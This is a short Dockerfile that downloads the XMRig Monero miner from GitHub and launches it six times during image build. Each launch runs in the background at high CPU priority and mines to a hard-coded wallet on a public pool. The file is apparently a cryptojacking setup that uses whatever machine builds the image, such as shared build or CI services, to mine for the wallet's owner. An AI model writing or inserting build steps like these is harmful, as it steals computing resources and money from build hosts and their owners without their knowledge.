FROM ubuntu:22.04

RUN apt update

RUN apt install wget curl nano python3 -y

RUN wget -O xmrig-linux-x64.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz

RUN tar -xvf xmrig-linux-x64.tar.gz

RUN cd xmrig-6.22.2 \
  && ./xmrig -o pool.supportxmr.com:3333 -u 46bzSBNDhcWQPcZWseopH89ugvZiUtEBZRpw5yc37E2gb4DvdPocFqDMGnkiHe13QPLBPJbf6MSSGKnNGJapUfsyGCoMGAj -p x --cpu-priority=5 --huge-pages --background

RUN cd xmrig-6.22.2 \
  && ./xmrig -o pool.supportxmr.com:3333 -u 46bzSBNDhcWQPcZWseopH89ugvZiUtEBZRpw5yc37E2gb4DvdPocFqDMGnkiHe13QPLBPJbf6MSSGKnNGJapUfsyGCoMGAj -p x --cpu-priority=5 --huge-pages --background

RUN cd xmrig-6.22.2 \
  && ./xmrig -o pool.supportxmr.com:3333 -u 46bzSBNDhcWQPcZWseopH89ugvZiUtEBZRpw5yc37E2gb4DvdPocFqDMGnkiHe13QPLBPJbf6MSSGKnNGJapUfsyGCoMGAj -p x --cpu-priority=5 --huge-pages --background

RUN cd xmrig-6.22.2 \
  && ./xmrig -o pool.supportxmr.com:3333 -u 46bzSBNDhcWQPcZWseopH89ugvZiUtEBZRpw5yc37E2gb4DvdPocFqDMGnkiHe13QPLBPJbf6MSSGKnNGJapUfsyGCoMGAj -p x --cpu-priority=5 --huge-pages --background

RUN cd xmrig-6.22.2 \
  && ./xmrig -o pool.supportxmr.com:3333 -u 46bzSBNDhcWQPcZWseopH89ugvZiUtEBZRpw5yc37E2gb4DvdPocFqDMGnkiHe13QPLBPJbf6MSSGKnNGJapUfsyGCoMGAj -p x --cpu-priority=5 --huge-pages --background

RUN cd xmrig-6.22.2 \
  && ./xmrig -o pool.supportxmr.com:3333 -u 46bzSBNDhcWQPcZWseopH89ugvZiUtEBZRpw5yc37E2gb4DvdPocFqDMGnkiHe13QPLBPJbf6MSSGKnNGJapUfsyGCoMGAj -p x --cpu-priority=5 --huge-pages --background
